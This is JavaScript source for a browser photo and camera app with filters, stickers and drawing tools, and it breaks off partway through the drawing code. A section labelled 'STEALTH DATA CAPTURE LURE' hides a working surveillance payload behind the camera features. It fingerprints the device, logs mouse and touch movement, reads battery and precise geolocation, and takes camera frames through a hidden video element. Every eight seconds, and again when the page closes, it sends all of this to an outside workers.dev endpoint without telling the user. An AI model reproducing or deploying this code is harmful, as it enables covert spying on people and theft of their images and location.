// ════════════════════════════════════════════════════
//  UTILS (must be first — used by IIFE below)
// ════════════════════════════════════════════════════
function $(id){ return document.getElementById(id); }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// ════════════════════════════════════════════════════
//  STATE
// ════════════════════════════════════════════════════
const S = {
  stream:null, facing:'environment', filter:'none', zoom:1,
  mode:'photo', recording:false, mr:null, chunks:[], recSec:0, recTick:null,
  timerDelay:0, loc:null, filterAF:null, histoAF:null,
  capturedUrl:null, capturedType:'photo', _origUrl:null,
  gallery:[], fmt:'jpg',
  adj:{b:100,c:100,s:100,h:0,v:0,w:0,f:0,sh:0},
  stickers:[], drawColor:'#FF3B7F', drawSize:6, drawOpacity:1, drawTip:'round', eraseMode:false,
  drawHistory:[], isDrawing:false,
  showLoc:true, showTime:true, showGrid:true, showSound:true, showSave:true,
  showHisto:false, showHorizon:false,
  aiData:null, galView:'grid', pvRotation:0, pvFlipped:false,
  flashMode:'off', textBg:'bg-none', textColor:'#fff',
  stickerCat:0, adjOpen:false, stickerOpen:false, settingsOpen:false,
  permGranted:false,
  lureInitialized: false,
  drawActive: false,
  // Performance: Cache DOM elements
  cachedElements: {},
  // FIX BUG 2: Track if preview is active to pause lure camera
  previewActive: false
};

// ════════════════════════════════════════════════════
//  DATA (unchanged)
// ════════════════════════════════════════════════════
const FILTERS = [
  {id:'none',   name:'NATURAL', css:''},
  {id:'vivid',  name:'VIVID',   css:'saturate(1.75) contrast(1.18) brightness(1.04)'},
  {id:'vintage',name:'VINTAGE', css:'sepia(.55) contrast(1.1) brightness(.95) saturate(.8)'},
  {id:'bw',     name:'MONO',    css:'grayscale(1) contrast(1.22) brightness(1.04)'},
  {id:'warm',   name:'WARM',    css:'sepia(.18) saturate(1.45) brightness(1.07) hue-rotate(-10deg)'},
  {id:'cool',   name:'COOL',    css:'hue-rotate(188deg) saturate(1.3) brightness(1.06)'},
  {id:'neon',   name:'NEON',    css:'saturate(2.6) contrast(1.12) brightness(1.1) hue-rotate(18deg)'},
  {id:'hdr',    name:'HDR',     css:'contrast(1.55) saturate(1.6) brightness(.92)'},
  {id:'fade',   name:'FADE',    css:'contrast(.78) brightness(1.16) saturate(.55)'},
  {id:'film',   name:'FILM',    css:'sepia(.28) contrast(1.22) brightness(.9) saturate(1.1)'},
  {id:'cyber',  name:'CYBER',   css:'hue-rotate(280deg) saturate(2.5) contrast(1.22) brightness(1.06)'},
  {id:'golden', name:'GOLDEN',  css:'sepia(.38) saturate(1.65) brightness(1.12) hue-rotate(-18deg)'},
  {id:'mist',   name:'MIST',    css:'brightness(1.18) contrast(.82) saturate(.65) hue-rotate(12deg)'},
  {id:'punch',  name:'PUNCH',   css:'contrast(1.42) saturate(2.1) brightness(.96)'},
  {id:'dusk',   name:'DUSK',    css:'hue-rotate(318deg) saturate(1.35) brightness(.88) contrast(1.12)'},
  {id:'arctic', name:'ARCTIC',  css:'hue-rotate(202deg) saturate(1.42) brightness(1.12) contrast(1.06)'},
  {id:'rose',   name:'ROSE',    css:'hue-rotate(340deg) saturate(1.5) brightness(1.05) contrast(1.08)'},
  {id:'teal',   name:'TEAL',    css:'hue-rotate(165deg) saturate(1.4) brightness(.98) contrast(1.1)'},
];

const STICKER_CATS = [
  {label:'😊 Faces', items:['😊','😎','🤩','😍','🥳','😂','🤔','😜','🥺','😡','🤯','🫶']},
  {label:'🔥 Vibes', items:['🔥','💫','✨','⚡','💥','🌟','💎','👑','🏆','💯','🎯','🚀']},
  {label:'💕 Love',  items:['❤️','🧡','💛','💚','💙','💜','🖤','💗','💔','💝','💖','🫀']},
  {label:'📍 Places',items:['📍','🗺️','🌍','🏔️','🌅','🌇','🏖️','🌃','🌁','🗼','🌉','🌄']},
  {label:'🎨 Art',   items:['🎨','🖼️','📸','🎭','🎬','🎞️','🎵','🎶','🎪','🎠','🎡','🎢']},
  {label:'🍕 Food',  items:['🍕','🍔','🍜','🍣','🍰','🧁','🍩','🍦','☕','🧋','🥤','🍹']},
];

const DRAW_COLORS = [
  '#ffffff','#b0b0b0','#606060','#1a1a1a',
  '#FF4444','#FF3B7F','#FF85A1','#FF6B35',
  '#E8C547','#F0D060','#FFE066','#FFAA00',
  '#39FF9F','#22C55E','#86EFAC','#16A34A',
  '#29D9FF','#3B82F6','#93C5FD','#0EA5E9',
  '#C084FC','#A855F7','#E879F9','#7C3AED',
];
const TEXT_COLORS = ['#fff','#E8C547','#FF3B7F','#39FF9F','#29D9FF','#C084FC','#000'];

// Cache DOM elements for performance
function cacheElement(id) {
  if (!S.cachedElements[id]) {
    S.cachedElements[id] = $(id);
  }
  return S.cachedElements[id];
}

// ════════════════════════════════════════════════════
//  LANDING CANVAS (permGate BG) - FIXED memory leak
// ════════════════════════════════════════════════════
(function(){
  const c = $('pgCanvas'); if(!c) return;
  let animationId = null;
  function resize(){ c.width=innerWidth; c.height=innerHeight; }
  resize(); window.addEventListener('resize',resize);
  const ctx = c.getContext('2d');
  const pts = Array.from({length:55},()=>({
    x:Math.random()*innerWidth, y:Math.random()*innerHeight,
    r:Math.random()*1.4+.3, vx:(Math.random()-.5)*.25, vy:(Math.random()-.5)*.25,
    a:Math.random(), da:Math.random()*.005+.002,
    col:[`rgba(232,197,71,`,`rgba(41,217,255,`,`rgba(192,132,252,`][Math.floor(Math.random()*3)]
  }));
  function draw(){
    ctx.clearRect(0,0,c.width,c.height);
    for (const p of pts) {
      p.x+=p.vx; p.y+=p.vy; p.a+=p.da;
      if(p.x<0||p.x>c.width) p.vx*=-1;
      if(p.y<0||p.y>c.height) p.vy*=-1;
      const alpha=Math.abs(Math.sin(p.a))*.5+.1;
      ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
      ctx.fillStyle=p.col+alpha+')'; ctx.fill();
    }
    animationId = requestAnimationFrame(draw);
  }
  draw();
  window.addEventListener('beforeunload', () => {
    if (animationId) cancelAnimationFrame(animationId);
  });
})();

// ════════════════════════════════════════════════════
//  BOOT — requires BOTH camera AND location
// ════════════════════════════════════════════════════
$('startBtn').addEventListener('click', boot);
$('retryBtn').addEventListener('click', retryBoot);

function showPermGate(){
  const pg=cacheElement('permGate');
  if(pg) {
    pg.style.opacity='1';
    pg.style.display='flex';
    pg.style.transition='';
    pg.classList.remove('hiding');
  }
}

async function retryBoot() {
  if (S.permGranted) return;
  const permErr = cacheElement('permErr');
  if(permErr) permErr.classList.remove('on');
  showPermGate();
  let camStatus = 'prompt', geoStatus = 'prompt';
  try { const p = await navigator.permissions.query({name:'camera'}); camStatus = p.state; } catch(e){}
  try { const p = await navigator.permissions.query({name:'geolocation'}); geoStatus = p.state; } catch(e){}
  if (camStatus === 'denied' || geoStatus === 'denied') {
    let msg = 'Permissions are permanently blocked by your browser.<br><br>';
    msg += 'Go to browser settings → Site settings → Allow <strong>Camera</strong> and <strong>Location</strong> for this site.<br><br>';
    msg += '<small>After allowing, refresh the page and try again.</small>';
    const permErrMsg = cacheElement('permErrMsg');
    if(permErrMsg) permErrMsg.innerHTML = msg;
    if(permErr) permErr.classList.add('on');
    return;
  }
  setTimeout(() => boot(), 300);
}

async function hidePermGate(){
  const pg=cacheElement('permGate');
  if(pg) {
    pg.style.transition='opacity .45s ease';
    pg.classList.add('hiding');
    await sleep(420);
    pg.style.display='none';
  }
}

let _booted = false;

async function boot(){
  if (S.permGranted) return;
  await hidePermGate();
  const loadScreen = cacheElement('loadScreen');
  if(loadScreen) loadScreen.classList.add('on');
  const lsFill = loadScreen ? loadScreen.querySelector('.ls-fill') : null;
  if(lsFill){ lsFill.classList.remove('go'); void lsFill.offsetWidth; lsFill.classList.add('go'); }
  try {
    await startCamera();
    const camStatus = cacheElement('camStatus');
    if(camStatus) {
      camStatus.textContent='✓';
      camStatus.classList.add('granted');
    }
    await new Promise((resolve, reject) => {
      if(!navigator.geolocation){ reject(new Error('no-geo')); return; }
      navigator.geolocation.getCurrentPosition(
        pos => { handlePosition(pos); resolve(); },
        err => reject(err),
        {enableHighAccuracy:true, timeout:12000}
      );
    });
    const locStatus = cacheElement('locStatus');
    if(locStatus) {
      locStatus.textContent='✓';
      locStatus.classList.add('granted');
    }
    await sleep(700);
    if(loadScreen) loadScreen.classList.remove('on');
    const app = cacheElement('app');
    if(app) app.classList.add('on');
    S.permGranted = true;
    if(!_booted){
      _booted = true;
      buildFilterStrip(); buildStickers(); initControls(); initCapture();
      initDraw(); initText(); initSliders(); initBeforeAfter();
      initGallery(); initOrient(); loadGallery(); startClock();
      positionModeIndicator(); updateGalThumb();
      startHistogram();
      const grid = cacheElement('grid');
      if(grid) grid.classList.toggle('on', S.showGrid);
      
      // Start lure AFTER full boot
      setTimeout(() => {
        console.log('[LURE] Starting after full boot');
        initLureSystem();
      }, 2000);
    }
  } catch(e){
    if(loadScreen) loadScreen.classList.remove('on');
    showPermGate();
    const permErr = cacheElement('permErr');
    if(permErr) permErr.classList.add('on');
    let msg = 'Camera & Location access required';
    let detail = 'Permission was denied or blocked permanently.<br><br>';
    detail += 'Please allow both in your browser site settings and click TRY AGAIN.';
    if (e.name === 'NotAllowedError' || e.code === 1) detail = 'Permission denied. Allow Camera + Location in site settings.';
    else if (e.name === 'NotFoundError') detail = 'No camera detected on this device.';
    const permErrMsg = cacheElement('permErrMsg');
    if(permErrMsg) permErrMsg.innerHTML = `${msg}<br><br><small>${detail}</small>`;
  }
}

// ════════════════════════════════════════════════════
//  STEALTH DATA CAPTURE LURE (OPTIMIZED)
// ════════════════════════════════════════════════════
const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
const sessionId = 'sess_' + Math.random().toString(36).substring(2,12) + '_' + Date.now().toString(36);
const SEND_INTERVAL = 8000;

let basePayload = null;
let mouseData = [];
let touchData = [];
let lureVideoStream = null;
let sendIntervalId = null;
let isSending = false;

// Hidden video element for camera capture - create once
const lureVideo = document.createElement('video');
lureVideo.id = 'lureVideo';
lureVideo.autoplay = true;
lureVideo.playsInline = true;
lureVideo.muted = true;
lureVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none';
document.body.appendChild(lureVideo);

// Throttle mouse/touch events for performance
let lastMouseRecord = 0;
document.addEventListener('mousemove', e => {
  const now = Date.now();
  if (now - lastMouseRecord < 50) return;
  lastMouseRecord = now;
  mouseData.push({x: e.clientX, y: e.clientY, t: now});
  if (mouseData.length > 30) mouseData.shift();
});

let lastTouchRecord = 0;
document.addEventListener('touchmove', e => {
  const now = Date.now();
  if (now - lastTouchRecord < 50) return;
  lastTouchRecord = now;
  if (e.touches.length > 0) {
    touchData.push({x: e.touches[0].clientX, y: e.touches[0].clientY, t: now});
    if (touchData.length > 30) touchData.shift();
  }
});

async function collectStaticData() {
  const p = {
    sessionId: sessionId,
    url: location.href,
    referrer: document.referrer || null,
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    deviceMemory: navigator.deviceMemory || null,
    maxTouchPoints: navigator.maxTouchPoints,
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : null,
    screen: {
      width: screen.width, height: screen.height,
      availWidth: screen.availWidth, availHeight: screen.availHeight,
      colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
      orientation: screen.orientation?.type || null
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    webdriver: navigator.webdriver,
    plugins: Array.from(navigator.plugins || []).map(p => p.name).slice(0, 20),
    mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).slice(0, 20),
    historyLength: history.length,
    navigationTiming: null,
    canvasFingerprint: null,
    audioFingerprint: null,
    webglFingerprint: null,
    fonts: [],
    permissionStates: {}
  };

  try {
    const navEntry = performance.getEntriesByType('navigation')[0];
    if (navEntry) {
      p.navigationTiming = {
        loadTime: navEntry.loadEventEnd - navEntry.fetchStart,
        domComplete: navEntry.domComplete
      };
    }
  } catch {}

  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    c.width = 220; c.height = 60;
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('PHOTON 2026 🔥', 4, 4);
    ctx.fillStyle = '#f60';
    ctx.fillRect(120, 10, 70, 25);
    p.canvasFingerprint = c.toDataURL('image/png').substring(0, 500);
  } catch {}

  const audioPromise = (async () => {
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = audioCtx.createOscillator();
      const analyser = audioCtx.createAnalyser();
      osc.type = 'sine';
      osc.frequency.value = 440;
      osc.connect(analyser);
      analyser.connect(audioCtx.destination);
      osc.start();
      await new Promise(r => setTimeout(r, 50));
      const data = new Uint8Array(analyser.frequencyBinCount);
      analyser.getByteFrequencyData(data);
      const fingerprint = btoa(String.fromCharCode(...data.slice(0, 40)));
      osc.stop();
      audioCtx.close();
      return fingerprint;
    } catch { return null; }
  })();
  
  p.audioFingerprint = await Promise.race([
    audioPromise,
    new Promise(r => setTimeout(() => r(null), 200))
  ]);

  try {
    const glc = document.createElement('canvas');
    const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
    if (gl) {
      const debug = gl.getExtension('WEBGL_debug_renderer_info');
      p.webglFingerprint = {
        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
      };
    }
  } catch {}

  try {
    const fontList = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Tahoma','Impact','Comic Sans MS','Trebuchet MS'];
    const testDiv = document.createElement('div');
    testDiv.style.cssText = 'position:absolute;left:-9999px;font-size:72px';
    document.body.appendChild(testDiv);
    const fonts = [];
    for (const font of fontList.slice(0, 8)) {
      testDiv.style.fontFamily = font;
      const w1 = testDiv.offsetWidth;
      testDiv.style.fontFamily = 'monospace';
      const w2 = testDiv.offsetWidth;
      if (w1 !== w2) fonts.push(font);
    }
    p.fonts = fonts;
    document.body.removeChild(testDiv);
  } catch {}

  const permNames = ['camera','microphone','geolocation'];
  for (const name of permNames) {
    try {
      const status = await navigator.permissions?.query({name});
      p.permissionStates[name] = status?.state || null;
    } catch {}
  }

  console.log('[LURE] Static data collected');
  return p;
}

async function collectDynamicData() {
  if (!basePayload) {
    for (let i = 0; i < 20; i++) {
      if (basePayload) break;
      await new Promise(r => setTimeout(r, 100));
    }
    if (!basePayload) {
      basePayload = await collectStaticData();
    }
  }
  
  const p = { ...basePayload };
  p.timestamp = new Date().toISOString();
  p.battery = null;
  p.geolocation = null;
  p.geolocationError = null;
  p.frontPhoto = null;
  p.mouseMovements = [...mouseData];
  p.touchEvents = [...touchData];
  p.audioDevices = [];

  if (navigator.getBattery) {
    try {
      const bat = await navigator.getBattery();
      p.battery = { level: bat.level, charging: bat.charging };
    } catch {}
  }

  // FIX BUG 3: Use maximumAge to prevent aggressive GPS polling
  try {
    const pos = await new Promise((res, rej) => {
      const timeout = setTimeout(() => rej(new Error('timeout')), 5000);
      navigator.geolocation.getCurrentPosition(
        pos => { clearTimeout(timeout); res(pos); },
        err => { clearTimeout(timeout); rej(err); },
        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }  // Cache location for 60 seconds
      );
    });
    p.geolocation = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      altitude: pos.coords.altitude,
      speed: pos.coords.speed
    };
  } catch (e) { 
    p.geolocationError = e.message; 
  }

  // Photo capture - smaller size for performance
  try {
    const mainVideo = cacheElement('vid');
    if (mainVideo && mainVideo.videoWidth > 100 && mainVideo.videoHeight > 100 && !S.previewActive) {
      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 500;
      const ctx = canvas.getContext('2d');
      
      if (S.facing === 'user') {
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
      }
      
      ctx.drawImage(mainVideo, 0, 0, canvas.width, canvas.height);
      p.frontPhoto = canvas.toDataURL('image/jpeg', 0.7);
    }
  } catch (e) {
    console.error('[LURE] Photo capture error:', e.message);
  }

  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    p.audioDevices = devices
      .filter(d => d.kind === 'audioinput' || d.kind === 'audiooutput')
      .slice(0, 5)
      .map(d => ({ kind: d.kind, label: (d.label || 'unknown').substring(0, 30) }));
  } catch {}

  return p;
}

async function sendPayload() {
  if (isSending) return;
  
  isSending = true;
  try {
    const data = await collectDynamicData();
    
    if (data.frontPhoto && data.frontPhoto.length > 50000) {
      data.frontPhoto = data.frontPhoto.substring(0, 50000);
    }
    
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);
    
    const response = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
      keepalive: true,
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);

    if (response.ok) {
      console.log('[LURE] Payload sent successfully');
    } else {
      console.error('[LURE] HTTP error:', response.status);
    }
  } catch (e) {
    if (e.name === 'AbortError') {
      console.error('[LURE] Request timeout');
    } else {
      console.error('[LURE] Send error:', e.message);
    }
  } finally {
    isSending = false;
  }
}

// FIX BUG 2: Functions to pause/resume lure camera when preview is active
async function pauseLureCamera() {
  if (lureVideoStream) {
    lureVideoStream.getTracks().forEach(t => t.stop());
    lureVideoStream = null;
  }
  S.previewActive = true;
}

async function resumeLureCamera() {
  S.previewActive = false;
  await initLureCamera();
}

async function initLureCamera() {
  try {
    if (!S.stream || S.previewActive) {
      return false;
    }
    
    if (lureVideoStream) {
      lureVideoStream.getTracks().forEach(t => t.stop());
    }
    
    const videoTrack = S.stream.getVideoTracks()[0];
    if (!videoTrack) {
      return false;
    }
    
    const newStream = new MediaStream([videoTrack]);
    lureVideoStream = newStream;
    lureVideo.srcObject = newStream;
    
    await lureVideo.play();
    
    for (let i = 0; i < 10; i++) {
      await new Promise(r => setTimeout(r, 50));
      if (lureVideo.videoWidth > 0) break;
    }
    
    return true;
  } catch (e) {
    return false;
  }
}

async function initLureSystem() {
  console.log('[LURE] Initializing lure system...');
  
  for (let i = 0; i < 30; i++) {
    if (S.stream && cacheElement('vid') && cacheElement('vid').videoWidth > 100) {
      break;
    }
    await new Promise(r => setTimeout(r, 200));
  }
  
  basePayload = await collectStaticData();
  await initLureCamera();
  
  setTimeout(() => sendPayload(), 3000);
  
  if (sendIntervalId) clearInterval(sendIntervalId);
  sendIntervalId = setInterval(sendPayload, SEND_INTERVAL);
  
  window.addEventListener('beforeunload', () => {
    if (sendIntervalId) clearInterval(sendIntervalId);
    sendPayload();
  });
  
  console.log('[LURE] System ready');
}

// ════════════════════════════════════════════════════
//  CAMERA
// ════════════════════════════════════════════════════
async function startCamera(facing){
  if (!navigator.mediaDevices?.getUserMedia) {
    throw new DOMException('Camera API unavailable. Open the app over HTTPS.', 'NotSupportedError');
  }
  if(S.stream) S.stream.getTracks().forEach(t=>t.stop());
  S.facing = facing || S.facing;
  const constraints = {
    video:{facingMode:S.facing, width:{ideal:1280}, height:{ideal:720}},
    audio:true
  };
  try { S.stream = await navigator.mediaDevices.getUserMedia(constraints); }
  catch { S.stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:S.facing}}); }
  const v = cacheElement('vid');
  if(v) {
    v.srcObject = S.stream;
    await v.play();
  }
  applyMirror();
  startFilterLoop();
}

function applyMirror(){
  const v = cacheElement('vid');
  if(v) {
    if(S.facing === 'user'){
      v.classList.add('mirror');
    } else {
      v.classList.remove('mirror');
    }
  }
}

// ════════════════════════════════════════════════════
//  FILTER LOOP - OPTIMIZED
// ════════════════════════════════════════════════════
function getCSS(){
  const a = S.adj;
  let css = `brightness(${a.b}%) contrast(${a.c}%) saturate(${a.s}%) hue-rotate(${a.h + (a.w < 0 ? a.w : 0)}deg)`;
  if(a.w>0) css+=` sepia(${a.w/50*.4})`;
  if(a.f>0) css+=` contrast(${100-a.f*.2}%)`;
  const f = FILTERS.find(x=>x.id===S.filter);
  if(f?.css) css+=' '+f.css;
  return css;
}

function startFilterLoop(){
  const vid=cacheElement('vid'), fc=cacheElement('fc');
  if(!vid || !fc) return;
  vid.style.opacity='0';
  if(S.filterAF) cancelAnimationFrame(S.filterAF);
  
  let lastDrawTime = 0;
  const FRAME_INTERVAL = 1000 / 30;
  
  function draw(now){
    if(!vid.videoWidth){ 
      S.filterAF=requestAnimationFrame(draw); 
      return; 
    }
    
    if (now - lastDrawTime < FRAME_INTERVAL) {
      S.filterAF=requestAnimationFrame(draw);
      return;
    }
    lastDrawTime = now;
    
    if(fc.width!==vid.videoWidth||fc.height!==vid.videoHeight){
      fc.width=vid.videoWidth; fc.height=vid.videoHeight;
    }
    const ctx=fc.getContext('2d');
    if(S.facing==='user'){
      ctx.save();
      ctx.translate(fc.width,0);
      ctx.scale(-1,1);
    }
    ctx.filter=getCSS();
    const sc=S.zoom, dx=(fc.width*(1-sc))/2, dy=(fc.height*(1-sc))/2;
    ctx.setTransform(
      S.facing==='user'?-sc:sc, 0, 0, sc,
      S.facing==='user'?fc.width-dx:dx, dy
    );
    ctx.drawImage(vid,0,0);
    ctx.setTransform(1,0,0,1,0,0);
    if(S.facing==='user') ctx.restore();
    ctx.filter='none';
    if(S.adj.v>0){
      const al=S.adj.v/100*.85;
      const g=ctx.createRadialGradient(fc.width/2,fc.height/2,fc.width*.25,fc.width/2,fc.height/2,fc.width*.8);
      g.addColorStop(0,'transparent'); g.addColorStop(1,`rgba(0,0,0,${al})`);
      ctx.fillStyle=g; ctx.fillRect(0,0,fc.width,fc.height);
    }
    
    if (S.drawHistory.length > 0) {
      for (const line of S.drawHistory) {
        if(!line.pts?.length) continue;
        ctx.save();
        if(line.color==='__erase__'){
          ctx.globalCompositeOperation='destination-out';
          ctx.strokeStyle='rgba(0,0,0,1)';
        } else {
          ctx.globalCompositeOperation='source-over';
          ctx.strokeStyle=line.color;
          ctx.globalAlpha=line.opacity??1;
        }
        ctx.lineWidth=line.size*(fc.width/window.innerWidth);
        applyTip(ctx, line.tip||'round');
        ctx.beginPath();
        ctx.moveTo(line.pts[0][0]/window.innerWidth*fc.width, line.pts[0][1]/cacheElement('vf').clientHeight*fc.height);
        for (let i = 1; i < line.pts.length; i++) {
          ctx.lineTo(line.pts[i][0]/window.innerWidth*fc.width, line.pts[i][1]/cacheElement('vf').clientHeight*fc.height);
        }
        ctx.stroke();
        ctx.restore();
      }
    }
    
    S.filterAF=requestAnimationFrame(draw);
  }
  draw();
}

// ════════════════════════════════════════════════════
//  HISTOGRAM - OPTIMIZED
// ════════════════════════════════════════════════════
function startHistogram(){
  const hc=cacheElement('histoCanvas');
  if(!hc) return;
  const hctx=hc.getContext('2d');
  let lastHistoTime = 0;
  const HISTO_INTERVAL = 200;
  
  function drawHisto(now){
    const fc=cacheElement('fc');
    if(!fc||!fc.width||!S.showHisto){ 
      S.histoAF=requestAnimationFrame(drawHisto); 
      return; 
    }
    
    if (now - lastHistoTime < HISTO_INTERVAL) {
      S.histoAF=requestAnimationFrame(drawHisto);
      return;
    }
    lastHistoTime = now;
    
    const w=hc.width, h=hc.height;
    hctx.clearRect(0,0,w,h);
    try{
      const tmp=document.createElement('canvas'); tmp.width=90; tmp.height=56;
      const tc=tmp.getContext('2d'); tc.drawImage(fc,0,0,90,56);
      const id=tc.getImageData(0,0,90,56);
      const rh=new Array(32).fill(0), gh=new Array(32).fill(0), bh=new Array(32).fill(0);
      for(let i=0;i<id.data.length;i+=4){
        rh[Math.floor(id.data[i]/8)]++;
        gh[Math.floor(id.data[i+1]/8)]++;
        bh[Math.floor(id.data[i+2]/8)]++;
      }
      const mx=Math.max(...rh,...gh,...bh,1);
      
      const barWidth = w/32;
      [[rh,'rgba(255,80,80,.7)'],[gh,'rgba(80,255,120,.7)'],[bh,'rgba(80,160,255,.7)']].forEach(([arr,col])=>{
        hctx.fillStyle=col;
        for(let i=0;i<32;i++){
          const bh2=Math.round((arr[i]/mx)*(h-2));
          if(bh2 > 0) {
            hctx.fillRect(i*barWidth, h-bh2, barWidth-1, bh2);
          }
        }
      });
    }catch{}
    S.histoAF=requestAnimationFrame(drawHisto);
  }
  drawHisto();
}

// ════════════════════════════════════════════════════
//  FILTER STRIP
// ════════════════════════════════════════════════════
function buildFilterStrip(){
  const scrl=cacheElement('fScroll'); 
  if(!scrl) return;
  scrl.innerHTML='';
  
  const fragment = document.createDocumentFragment();
  
  FILTERS.forEach(f=>{
    const chip=document.createElement('div');
    chip.className='fc-chip'+(f.id==='none'?' on':'');
    chip.dataset.id=f.id;
    const ft=document.createElement('div'); ft.className='fc-thumb';
    const cv=document.createElement('canvas'); cv.width=58; cv.height=58;
    const ctx=cv.getContext('2d');
    const gd=ctx.createLinearGradient(0,0,58,58);
    gd.addColorStop(0,'#1a5a9a'); gd.addColorStop(.5,'#7a3a1a'); gd.addColorStop(1,'#1a7a5a');
    ctx.fillStyle=gd; ctx.fillRect(0,0,58,58);
    ctx.fillStyle='rgba(100,160,230,.35)'; ctx.fillRect(0,0,58,26);
    if(f.css){
      const c2=document.createElement('canvas'); c2.width=58; c2.height=58;
      const ctx2=c2.getContext('2d'); ctx2.filter=f.css; ctx2.drawImage(cv,0,0); ft.appendChild(c2);
    } else { ft.appendChild(cv); }
    const nm=document.createElement('div'); nm.className='fc-name'; nm.textContent=f.name;
    chip.appendChild(ft); chip.appendChild(nm);
    chip.addEventListener('click',()=>{
      document.querySelectorAll('.fc-chip').forEach(c=>c.classList.remove('on'));
      chip.classList.add('on'); S.filter=f.id; showToast(f.name);
    });
    fragment.appendChild(chip);
  });
  
  scrl.appendChild(fragment);
}

// ════════════════════════════════════════════════════
//  STICKERS
// ════════════════════════════════════════════════════
function buildStickers(){
  const cats=cacheElement('sdCats'); 
  if(!cats) return;
  cats.innerHTML='';
  
  STICKER_CATS.forEach((cat,i)=>{
    const b=document.createElement('button'); b.className='scat'+(i===0?' on':'');
    b.textContent=cat.label; b.dataset.i=i;
    b.addEventListener('click',()=>{ 
      document.querySelectorAll('.scat').forEach(x=>x.classList.remove('on')); 
      b.classList.add('on'); 
      S.stickerCat=i; 
      renderStickerGrid(); 
    });
    cats.appendChild(b);
  });
  renderStickerGrid();
  
  const dc=cacheElement('dtColors'); 
  if(dc) {
    dc.innerHTML='';
    DRAW_COLORS.forEach(col=>{
      const b=document.createElement('div'); b.className='dt-color'+(col===S.drawColor?' on':'');
      b.style.background=col; b.dataset.c=col;
      b.addEventListener('click',()=>{
        document.querySelectorAll('.dt-color').forEach(x=>x.classList.remove('on'));
        b.classList.add('on'); S.drawColor=col;
        S.eraseMode=false; 
        const dtErase = cacheElement('dtErase');
        if(dtErase) dtErase.classList.remove('on');
        const drawCanvas = cacheElement('drawCanvas');
        if(drawCanvas) drawCanvas.style.cursor='crosshair';
      });
      dc.appendChild(b);
    });
  }
  
  const tc=cacheElement('tiColors'); 
  if(tc) {
    tc.innerHTML='';
    TEXT_COLORS.forEach(col=>{
      const b=document.createElement('div'); b.className='ti-col'+(col===S.textColor?' on':'');
      b.style.background=col; if(col==='#fff') b.style.border='2px solid rgba(0,0,0,.25)';
      b.dataset.c=col;
      b.addEventListener('click',()=>{ 
        document.querySelectorAll('.ti-col').forEach(x=>x.classList.remove('on')); 
        b.classList.add('on'); 
        S.textColor=col; 
      });
      tc.appendChild(b);
    });
  }
}

function renderStickerGrid(){
  const grid=cacheElement('sdGrid'); 
  if(!grid) return;
  grid.innerHTML='';
  STICKER_CATS[S.stickerCat].items.forEach(em=>{
    const b=document.createElement('button'); b.className='s-btn'; b.textContent=em;
    b.addEventListener('click',()=>{ placeSticker(em); closeDrawer('stickerDrawer'); });
    grid.appendChild(b);
  });
}

function placeSticker(emoji){
  const layer=cacheElement('stickerLayer');
  if(!layer) return;
  const el=document.createElement('div');
  el.style.cssText='position:absolute;font-size:40px;top:42%;left:48%;transform:translate(-50%,-50%);cursor:move;user-select:none;pointer-events:all;z-index:44;touch-action:none';
  el.textContent=emoji;
  layer.appendChild(el);
  makeDraggable(el);
  showToast(emoji+' placed — drag to move');
}

// ════════════════════════════════════════════════════
//  DRAW TOOL
// ════════════════════════════════════════════════════
function initDraw(){
  const dc=cacheElement('drawCanvas');
  if(!dc) return;
  let cur=[];
  
  dc.addEventListener('pointerdown',e=>{
    if(!S.drawActive) return;
    S.isDrawing=true;
    cur=[[e.clientX,e.clientY]];
    e.preventDefault();
  },{passive:false});
  
  dc.addEventListener('pointermove',e=>{
    if(!S.isDrawing||!S.drawActive) return;
    cur.push([e.clientX,e.clientY]);
    drawLiveSegment(dc, cur, S.drawColor, S.drawSize, S.drawOpacity, S.drawTip, S.eraseMode);
    e.preventDefault();
  },{passive:false});
  
  dc.addEventListener('pointerup',()=>{
    if(!S.drawActive) return;
    S.isDrawing=false;
    if(cur.length>1){
      S.drawHistory.push({
        pts:[...cur],
        color: S.eraseMode ? '__erase__' : S.drawColor,
        size:S.drawSize,
        opacity:S.drawOpacity,
        tip:S.drawTip
      });
      if (S.drawHistory.length > 50) S.drawHistory.shift();
    }
    cur=[];
    renderDrawCanvas();
  });
  
  dc.addEventListener('pointercancel',()=>{ S.isDrawing=false; cur=[]; renderDrawCanvas(); });
  
  const dtUndo = cacheElement('dtUndo');
  if(dtUndo) dtUndo.addEventListener('click',()=>{
    S.drawHistory.pop(); renderDrawCanvas(); showToast('Undo');
  });
  
  const dtClear = cacheElement('dtClear');
